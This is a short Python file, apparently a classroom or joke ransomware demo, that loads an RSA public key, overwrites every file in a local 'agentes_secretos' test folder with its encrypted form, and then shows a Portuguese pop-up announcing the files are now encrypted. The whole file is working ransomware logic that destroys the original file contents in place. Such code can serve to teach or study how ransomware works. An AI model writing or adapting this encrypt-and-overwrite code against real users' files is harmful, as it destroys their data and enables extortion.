from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding

from common import list_files, show_pop_up, PUBLIC_KEY_FILE_NAME

import os

TEST_DIR_TO_ENCRYPT = f"{os.path.dirname(os.path.abspath(__file__))}/agentes_secretos"

def read_public_key(filename):
    with open(filename, "rb") as key_file:
        public_key = serialization.load_pem_public_key(
            key_file.read(),
            backend=default_backend()
        )

    return public_key


def encrypt_file(filename, public_key):
    with open(filename, "rb") as file_to_encrypt:
        file_data = file_to_encrypt.read()

    encrypted_data = public_key.encrypt(
        file_data,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    with open(filename, "wb") as encrypted_file:
        encrypted_file.write(encrypted_data)


def main():
    public_key = read_public_key(PUBLIC_KEY_FILE_NAME)

    for filename in list_files(TEST_DIR_TO_ENCRYPT):
        encrypt_file(filename, public_key)

    show_pop_up("Toma um Renzomware!!", "Seus arquivos de gatinhos agora estão encriptados, muahaha!!")


if __name__ == "__main__":
    main()